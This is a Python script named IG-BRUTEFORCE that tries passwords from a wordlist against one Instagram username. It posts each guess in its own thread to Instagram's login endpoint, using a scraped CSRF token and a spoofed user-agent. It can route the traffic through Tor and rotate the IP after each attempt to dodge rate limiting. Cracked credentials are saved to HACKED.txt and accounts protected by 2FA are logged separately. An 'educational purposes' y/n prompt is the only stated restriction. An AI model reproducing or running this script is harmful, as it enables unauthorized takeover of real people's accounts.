from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random, webbrowser
from random import randint
from six.moves import input
from stem import Signal
from stem.control import Controller

CheckVersion = str(sys.version)
import re
from datetime import datetime

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yellow#
#########################

print('''    
\033[32m
██╗-██████╗-------██████╗-██████╗-██╗---██╗████████╗███████╗███████╗-██████╗-██████╗--██████╗███████╗
██║██╔════╝-------██╔══██╗██╔══██╗██║---██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██║██║--███╗█████╗██████╔╝██████╔╝██║---██║---██║---█████╗--█████╗--██║---██║██████╔╝██║-----█████╗--
██║██║---██║╚════╝██╔══██╗██╔══██╗██║---██║---██║---██╔══╝--██╔══╝--██║---██║██╔══██╗██║-----██╔══╝--
██║╚██████╔╝------██████╔╝██║--██║╚██████╔╝---██║---███████╗██║-----╚██████╔╝██║--██║╚██████╗███████╗
╚═╝-╚═════╝-------╚═════╝-╚═╝--╚═╝-╚═════╝----╚═╝---╚══════╝╚═╝------╚═════╝-╚═╝--╚═╝-╚═════╝╚══════╝
\033[35m====================================================================================================\033[35m
\033[37m#                                                                       Developed by WHITEDH4CKER  #\033[37m
\033[33m====================================================================================================\033[33m
\033[34m#                                                    https://github.com/WHITEDH4CKER/IG-BRUTEFORCE #\033[34m      
\033[39m====================================================================================================\033[39m
\033[32m''')

class InstaBrute(object):
    def __init__(self):

        try:
            user = input('INSTAGRAM USERNAME : ')
            Combo = input('WORDLIST PATH : ')
            print(gr+"""
==================================
[---]  """ + wi + """ WHITEDH4CKER """ + gr + """        [---]
==================================
[---]  """ + wi + """ IG-BRUTEFORCE """ + gr + """       [---]
==================================
[---]         """ + yl + """ CONFIG """ + gr + """       [---]
=================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+""" IG-ATTACK:  """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
==================================\n"""+wi)

        except:
            print(' The tool was arrested exit ')
            sys.exit()

        educational_purpose = input('Are you using this tool for educational purposes? (y/n): ')
        if educational_purpose.lower() != 'y':
            print('Sorry, this tool is only for educational purposes.')
            sys.exit()

        telegram_member = input('Are you a member of our Telegram group? (y/n): ')
        if telegram_member.lower() != 'y':
            print('Please join our Telegram group: https://t.me/WHITEDR00M')
            webbrowser.open('https://t.me/WHITEDR00M', new=2)  # Open the link in the default browser
            sys.exit()

        tor_use = input('Do you want to use Tor? (y/n): ')
        if tor_use.lower() == 'y':
            self.use_tor = True
            self.start_tor()
        else:
            self.use_tor = False

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        thread = []
        self.Coutprox = 0
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
        for j in thread:
            j.join()

    def start_tor(self):
        os.system("tor &")
        time.sleep(5)  # Give Tor some time to start

    def change_ip(self):
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time_stamp = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_stamp}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            if self.use_tor:
                s.proxies = {
                    'http': 'socks5://127.0.0.1:9050',
                    'https': 'socks5://127.0.0.1:9050'
                }

            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            print(yl+f'{user}:{pwd}\nTRYING===============ATTACKING')

            if 'authenticated": true' in r.text:
                print(wi+"["+gr+"+"+wi+"] Password [ "+gr+pwd+wi+" ]"+gr+" Is Correct :)")
                with open('HACKED.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                print(wi+"["+yl+"!"+wi+"]"+yl+" Warning: This account use ("+rd+"2F Authentication"+yl+"):"+rd+" It's Locked"+yl+" !!!")
                with open('2FAVerify.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')

            if self.use_tor:
                self.change_ip()
                time.sleep(5)  # Wait after changing IP

if __name__ == "__main__":
    InstaBrute()
